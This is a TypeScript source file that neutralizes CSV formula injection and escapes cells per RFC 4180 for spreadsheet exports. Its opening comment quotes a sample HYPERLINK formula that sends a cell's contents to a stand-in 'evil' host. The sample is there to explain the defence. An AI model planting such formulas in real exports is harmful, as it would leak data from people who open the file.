/**
 * CSV formula-injection guard, shared by every exporter that writes attribute/SKU text into a
 * CSV cell. A value like `=HYPERLINK("http://evil/?"&A1,"open")` executes as a formula the
 * moment Excel/Sheets opens the file — and these values are not always PM-authored: a supplier's
 * submitted attribute text can flow into an Akeneo export or a leaflet-coverage report verbatim
 * once a PM saves it (see src/utils/akeneo-export.utils.ts, src/pages/im/LeafletCoverageTab.tsx).
 */

/** Leading characters Excel/Sheets treat as "this cell is a formula". */
const FORMULA_TRIGGER_CHARS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * True for a value that is nothing but a (optionally signed/decimal) number, e.g. "-5" or
 * "+3.2". A leading "-" or "+" here is a sign, not a formula trigger — neutralizing it would
 * turn a real numeric value into text and break numeric import/columns downstream, so plain
 * numbers are deliberately exempt from the guard below.
 */
const isPlainNumber = (value: string): boolean => /^[+-]?\d+(\.\d+)?$/.test(value.trim());

const needsFormulaGuard = (value: string): boolean =>
  value.length > 0 && FORMULA_TRIGGER_CHARS.has(value[0]) && !isPlainNumber(value);

/**
 * Prefixes a leading formula-trigger character with a single quote so a spreadsheet app renders
 * the cell as literal text instead of executing it. Does NOT quote commas/newlines/quotes — use
 * this alone when the cell will pass through a library that writes CSV/XLSX itself (e.g.
 * `XLSX.utils.json_to_sheet` + `XLSX.writeFile(..., { bookType: 'csv' })`), since that library
 * already applies its own RFC 4180 quoting and quoting here too would double-escape the value.
 */
export const neutralizeCsvFormula = (value: string): string =>
  needsFormulaGuard(value) ? `'${value}` : value;

/**
 * Full CSV-cell escaping for hand-assembled CSV text (`cells.map(escapeCsvCell).join(',')`):
 * neutralizes formula injection (see `neutralizeCsvFormula`), then wraps the cell in double
 * quotes — doubling any embedded quote — whenever it contains a comma, double quote, CR or LF,
 * per RFC 4180.
 */
export const escapeCsvCell = (value: string): string => {
  const guarded = neutralizeCsvFormula(value);
  return /["\r\n,]/.test(guarded) ? '"' + guarded.replace(/"/g, '""') + '"' : guarded;
};
